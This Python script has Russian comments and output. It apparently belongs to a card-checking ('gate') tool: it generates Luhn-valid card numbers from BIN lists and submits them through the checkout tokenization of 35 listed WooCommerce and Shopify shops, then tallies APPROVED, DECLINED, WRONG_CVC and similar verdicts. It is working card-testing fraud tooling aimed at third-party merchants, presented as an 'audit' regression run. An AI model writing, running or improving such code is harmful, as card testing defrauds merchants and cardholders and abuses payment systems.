# language: Python 3.12+, file: scratch/check_35_stores.py, target: Windows 11
"""Боевая проверка раздела 2 аудита: 35 магазинов (20 Woo Store API + 15 Shopify).

Гоняем сгенерированный по Луну пробник через новые пути токенизации (общий
gate_client.tokenize_payment_method) и проверяем, что вердикты остаются внутри
config.VERDICTS — ни одного UNKNOWN, ни одного статуса вне таксономии.

    python scratch/check_35_stores.py [--store N] [--shopify N] [--concurrency 5]

Отчёт: data/results/check35_<timestamp>.json (+ краткая сводка в stdout).
"""
from __future__ import annotations

import argparse
import asyncio
import json
import pathlib
import random
import sys
import time
from collections import Counter

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

import config
import gate_client as gc
import shopify_gate as sg
import store_gate as stg

MAX_PRICE = 2000


def load_targets(path: pathlib.Path, limit: int) -> list[str]:
    out: list[str] = []
    for line in path.read_text(encoding="utf-8").splitlines():
        line = line.strip().rstrip("/")
        if not line or line.startswith("#"):
            continue
        if not line.startswith("http"):
            line = "https://" + line
        out.append(line)
        if len(out) >= limit:
            break
    return out


def probe_card() -> str:
    p = gc.gen_probe_card(random.choice(gc._PROBE_BINS))
    return f"{p['number']}|{p['mm']}|{p['yy']}|{p['cvc']}"


async def run_one(kind: str, target: str, sem: asyncio.Semaphore, results: list) -> None:
    card = probe_card()
    t0 = time.monotonic()
    async with sem:
        try:
            if kind == "store":
                res = await asyncio.wait_for(stg.check_target(target, card, None, MAX_PRICE), timeout=120)
            else:
                res = await asyncio.wait_for(sg.check_target(target, card, None, MAX_PRICE), timeout=120)
        except Exception as exc:  # noqa: BLE001 — боевой прогон, любая сеть/парсер
            res = {"status": "ERROR", "detail": f"{type(exc).__name__}: {exc}"[:150]}
    latency = int((time.monotonic() - t0) * 1000)
    status = str(res.get("status", ""))
    record = {
        "kind": kind,
        "target": target,
        "status": status,
        # handled = вердикт из таксономии ИЛИ документированный технический статус,
        # который coerce_verdict сводит к ERROR (CAPTCHA_CHECKOUT, NO_NONCE, HTTP 4xx...).
        # Именно это и есть контракт: наружу не должен утекать UNKNOWN.
        "handled": status in config.VERDICTS or config.coerce_verdict(status) == "ERROR",
        "in_taxonomy": status in config.VERDICTS,
        "coerced": config.coerce_verdict(status),
        "refundable": config.is_refundable(status),
        "detail": str(res.get("detail", ""))[:180],
        "amount_cents": res.get("amount_cents", 0),
        "currency": res.get("currency", ""),
        "latency_ms": latency,
        "card": gc.mask_pan(card),
    }
    results.append(record)
    mark = "OK " if record["handled"] else "!!!"
    print(f"{mark} [{status:16}] {kind:5} {target[:46]:46} {latency:6}ms  {record['detail'][:70]}", flush=True)


async def main() -> int:
    ap = argparse.ArgumentParser(description="Проверка 35 магазинов после правок раздела 2")
    ap.add_argument("--store", type=int, default=20, help="сколько Woo Store API целей")
    ap.add_argument("--shopify", type=int, default=15, help="сколько Shopify целей")
    ap.add_argument("--concurrency", type=int, default=5)
    args = ap.parse_args()

    store_targets = load_targets(ROOT / "data" / "store_targets.txt", args.store)
    shopify_targets = load_targets(ROOT / "data" / "shopify_targets.txt", args.shopify)
    total = len(store_targets) + len(shopify_targets)
    print("=" * 100)
    print(f"[*] БОЕВАЯ ПРОВЕРКА: {total} магазинов ({len(store_targets)} Store API + {len(shopify_targets)} Shopify)")
    print(f"[*] Каждой цели — свежий Luhn-валидный пробник, крышка {MAX_PRICE}c, прокси: direct, конкурентность {args.concurrency}")
    print("=" * 100, flush=True)

    sem = asyncio.Semaphore(args.concurrency)
    results: list[dict] = []
    tasks = [asyncio.create_task(run_one("store", t, sem, results)) for t in store_targets]
    tasks += [asyncio.create_task(run_one("shopify", t, sem, results)) for t in shopify_targets]
    await asyncio.gather(*tasks)

    by_status = Counter(r["status"] for r in results)
    outside = [r for r in results if not r["handled"]]
    unknown = [r for r in results if r["status"] == "UNKNOWN"]
    clean = [r for r in results if r["status"].startswith("DECLINED") or r["status"].startswith("APPROVED")
             or r["status"].startswith("3DS") or r["status"] in ("PI_PENDING", "RATE_LIMITED", "WRONG_CVC", "RESTRICTED", "INVALID", "EXPIRED")]
    lat = sorted(r["latency_ms"] for r in results)
    median = lat[len(lat) // 2] if lat else 0

    print("\n" + "=" * 100)
    print(f"[*] ИТОГ: {len(results)} прогонов | чистых вердиктов процессора: {len(clean)} "
          f"| технических сбоев (ERROR, refundable): {len(results) - len(clean)} "
          f"| НЕ обработано: {len(outside)} | UNKNOWN: {len(unknown)} | медиана {median}ms")
    for st, n in by_status.most_common():
        print(f"    {config.icon(st)} {st:18} {n}")
    if outside:
        print("\n[!] НЕ ОБРАБОТАННЫЕ СТАТУСЫ (регресс: ни вердикт, ни сводимый к ERROR):")
        for r in outside:
            print(f"    {r['kind']:5} {r['target']} -> {r['status']!r} | {r['detail'][:80]}")
    if unknown:
        print("\n[!] UNKNOWN — вердикт потерян:")
        for r in unknown:
            print(f"    {r['kind']:5} {r['target']} | {r['detail'][:80]}")

    out_dir = ROOT / "data" / "results"
    out_dir.mkdir(parents=True, exist_ok=True)
    report = out_dir / f"check35_{time.strftime('%Y%m%d_%H%M%S')}.json"
    report.write_text(json.dumps({
        "total": len(results), "clean": len(clean), "outside_taxonomy": len(outside),
        "unknown": len(unknown), "median_latency_ms": median, "by_status": dict(by_status),
        "results": sorted(results, key=lambda r: (r["kind"], r["target"])),
    }, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"\n[*] Отчёт: {report}")
    return 0 if not outside else 1


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
